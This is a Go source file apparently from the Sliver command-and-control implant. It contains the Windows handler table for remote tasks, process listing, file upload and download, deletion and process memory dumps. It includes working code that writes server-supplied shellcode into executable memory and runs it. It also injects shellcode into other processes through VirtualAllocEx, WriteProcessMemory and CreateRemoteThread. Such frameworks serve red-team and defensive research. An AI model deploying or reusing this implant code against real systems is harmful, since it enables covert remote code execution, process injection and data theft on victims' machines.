package main

import (
	// {{if .Debug}}
	"log"
	// {{else}}
	// {{end}}

	pb "sliver/protobuf"
	"syscall"
	"unsafe"

	"github.com/golang/protobuf/proto"
)

var (
	windowsHandlers = map[string]interface{}{
		pb.MsgTask:           taskHandler,
		pb.MsgRemoteTask:     remoteTaskHandler,
		pb.MsgPsListReq:      psHandler,
		pb.MsgPing:           pingHandler,
		pb.MsgKill:           killHandler,
		pb.MsgDirListReq:     dirListHandler,
		pb.MsgDownloadReq:    downloadHandler,
		pb.MsgUploadReq:      uploadHandler,
		pb.MsgCdReq:          cdHandler,
		pb.MsgPwdReq:         pwdHandler,
		pb.MsgRmReq:          rmHandler,
		pb.MsgMkdirReq:       mkdirHandler,
		pb.MsgProcessDumpReq: dumpHandler,
	}
)

func getSystemHandlers() map[string]interface{} {
	return windowsHandlers
}

// ---------------- Windows Handlers ----------------

func taskHandler(send chan *pb.Envelope, data []byte) {
	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	size := len(task.Data)
	addr, _ := sysAlloc(size)
	buf := (*[9999999]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; index++ {
		buf[index] = task.Data[index]
	}
	// {{if .Debug}}
	log.Printf("creating local thread with start address: 0x%08x", addr)
	// {{end}}
	createThread.Call(0, 0, addr, 0, 0, 0)
}

func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
}

// ---------------- Platform Code ----------------

const (
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x000040
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	createThread       = kernel32.MustFindProc("CreateThread")
)

func sysAlloc(size int) (uintptr, error) {
	n := uintptr(size)
	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle syscall.Handle, data []byte) error {

	// Create native buffer with the shellcode
	dataSize := len(data)
	// {{if .Debug}}
	log.Println("creating native data buffer ...")
	// {{end}}
	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if dataAddr == 0 {
		return err
	}
	dataBuf := (*[9999999]byte)(unsafe.Pointer(dataAddr))
	for index, value := range data {
		dataBuf[index] = value
	}

	// Remotely allocate memory in the target process
	// {{if .Debug}}
	log.Println("allocating remote process memory ...")
	// {{end}}
	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	// {{if .Debug}}
	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	// {{end}}
	if remoteAddr == 0 {
		// {{if .Debug}}
		log.Println("[!] failed to allocate remote process memory")
		// {{end}}
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(dataAddr), ptr(dataSize), 0)
	// {{if .Debug}}
	log.Printf("writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
	// {{end}}
	if writeMemorySuccess == 0 {
		// {{if .Debug}}
		log.Printf("[!] failed to write data into remote process")
		// {{end}}
		return err
	}

	// Create the remote thread to where we wrote the shellcode
	// {{if .Debug}}
	log.Println("successfully injected data, starting remote thread ....")
	// {{end}}
	createThreadSuccess, _, err := createRemoteThread.Call(uintptr(processHandle), 0, 0, uintptr(remoteAddr), 0, 0, 0)
	// {{if .Debug}}
	log.Printf("createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
	// {{end}}
	if createThreadSuccess == 0 {
		// {{if .Debug}}
		log.Printf("[!] failed to create remote thread")
		// {{end}}
		return err
	}
	return nil
}

// RemoteThreadTaskInjection - Injects Task into a processID using remote threads
func remoteThreadTaskInjection(processID int, data []byte) error {
	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
	if processHandle == 0 {
		return err
	}
	err = injectTask(processHandle, data)
	if err != nil {
		return err
	}
	return nil
}
